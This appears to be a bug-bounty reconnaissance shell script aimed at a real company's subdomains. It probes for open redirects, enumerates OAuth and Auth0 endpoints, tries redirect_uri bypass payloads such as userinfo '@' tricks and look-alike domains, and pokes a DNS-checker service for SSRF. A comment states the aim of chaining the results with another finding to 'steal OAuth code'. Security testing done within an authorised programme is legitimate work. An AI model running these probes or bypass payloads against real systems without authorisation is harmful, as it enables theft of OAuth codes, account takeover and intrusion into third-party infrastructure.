#!/usr/bin/env zsh
# OAuth redirect_uri bypass probe — community.wiz.io / auth0.*.wiz.io
# Chain with F001: if redirect_uri can be set to win-test.wiz.io → steal OAuth code
#
# SAFE: all probes check redirect behavior only, no credentials, no real user flows
# Usage: zsh ~/bug-bounty-hunting-/scripts/oauth-redirect-probe-wiz.sh

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/go/bin:$HOME/go/bin:$HOME/.local/bin

RESULTS=~/bug-bounty-hunting-/results/wiz.io/03-vulns
mkdir -p "$RESULTS"

echo "=== OAuth / Redirect Probe — wiz.io ==="

# ----------------------------------------------------------------
# 1. tracking.wiz.io — Open Redirect Check
# ----------------------------------------------------------------
echo ""
echo "=== tracking.wiz.io — open redirect check ==="
# Check what parameters it accepts
curl -sI "https://tracking.wiz.io/" 2>/dev/null | head -12
echo ""

# Common click-tracking parameter patterns
for param in "url" "redirect" "r" "to" "goto" "link" "u" "dest" "destination" "next"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
    -G --data-urlencode "${param}=https://example.com" \
    "https://tracking.wiz.io/" 2>/dev/null)
  loc=$(curl -sI --connect-timeout 8 \
    -G --data-urlencode "${param}=https://example.com" \
    "https://tracking.wiz.io/" 2>/dev/null | grep -i "^location:" | head -1)
  echo "${code}  ?${param}=  loc: ${loc}"
done

# Try common path patterns
for p in /click /r /redirect /go /track /out; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
    "https://tracking.wiz.io${p}?url=https://example.com" 2>/dev/null)
  loc=$(curl -sI --connect-timeout 8 \
    "https://tracking.wiz.io${p}?url=https://example.com" 2>/dev/null \
    | grep -i "^location:" | head -1)
  echo "${code}  ${p}?url=  loc: ${loc}"
done

# ----------------------------------------------------------------
# 2. community.wiz.io — OAuth flow discovery
# ----------------------------------------------------------------
echo ""
echo "=== community.wiz.io — OAuth / SSO endpoints ==="
# Map the OAuth endpoints exposed
for ep in \
  /auth \
  /oauth \
  /oauth/authorize \
  /oauth/token \
  /auth/login \
  /auth/oauth2 \
  /session/sso_provider \
  /session/sso \
  /.well-known/openid-configuration \
  /login; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 "https://community.wiz.io${ep}" 2>/dev/null)
  echo "${code}  ${ep}"
done

echo ""
echo "=== community.wiz.io — OAuth allow page param discovery ==="
# Get the OAuthAuthorizationAllowPage URL structure
curl -sk "https://community.wiz.io/" 2>/dev/null | grep -oEi '(oauth|auth|client_id|redirect_uri)[^"]*"[^"]{5,50}' | head -10
curl -sk "https://community.wiz.io/auth" 2>/dev/null | grep -oEi '(client_id|redirect_uri|response_type|scope)[^"]*"[^"]{5,80}' | head -10

# ----------------------------------------------------------------
# 3. Auth0 instances — discover redirect_uri patterns
# ----------------------------------------------------------------
echo ""
echo "=== Auth0 instances — redirect_uri enumeration ==="
for auth0 in auth0.demo.wiz.io auth0.e2e.wiz.io auth0.test.wiz.io; do
  echo "--- $auth0 ---"
  # OpenID config exposes supported redirect URIs and grant types
  curl -sk "https://${auth0}/.well-known/openid-configuration" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30
  # JWKS endpoint
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 "https://${auth0}/.well-known/jwks.json" 2>/dev/null)
  echo "  JWKS status: $code"
done

# ----------------------------------------------------------------
# 4. Test redirect_uri manipulation on community.wiz.io OAuth
# ----------------------------------------------------------------
echo ""
echo "=== redirect_uri bypass test ==="
# Attempt OAuth with win-test.wiz.io as redirect_uri
# This should fail (be rejected) — we're checking IF it gets followed vs rejected
# NOT providing credentials — just checking the redirect behavior
for redir in \
  "https://win-test.wiz.io/" \
  "https://win-test.wiz.io/callback" \
  "https://app.wiz.io.win-test.wiz.io/" \
  "https://app.wiz.io@win-test.wiz.io/" \
  "https://app.wiz.io%40win-test.wiz.io/"; do
  # Try on community.wiz.io OAuth if endpoint discovered
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
    "https://community.wiz.io/oauth/authorize?client_id=test&redirect_uri=${redir}&response_type=code" 2>/dev/null)
  loc=$(curl -sI --connect-timeout 8 \
    "https://community.wiz.io/oauth/authorize?client_id=test&redirect_uri=${redir}&response_type=code" 2>/dev/null \
    | grep -i "^location:" | head -1)
  echo "redirect_uri=${redir}  status=${code}  loc=${loc}"
done

# ----------------------------------------------------------------
# 5. dynamic-dns-checker.wiz.io — SSRF probe
# ----------------------------------------------------------------
echo ""
echo "=== dynamic-dns-checker.wiz.io — service fingerprint + SSRF test ==="
curl -sI "https://dynamic-dns-checker.wiz.io/" 2>/dev/null | head -15
echo ""
curl -sk "https://dynamic-dns-checker.wiz.io/" 2>/dev/null | head -c 500
echo ""

# Path probe — what endpoints does this service expose?
for ep in /health /api /check /verify /lookup /dns /query /v1 /status; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 "https://dynamic-dns-checker.wiz.io${ep}" 2>/dev/null)
  body=$(curl -sk --connect-timeout 8 "https://dynamic-dns-checker.wiz.io${ep}" 2>/dev/null | head -c 150)
  echo "${code}  ${ep}  |  ${body}"
done

echo ""
echo "=== COMPLETE — results in $RESULTS/ ==="
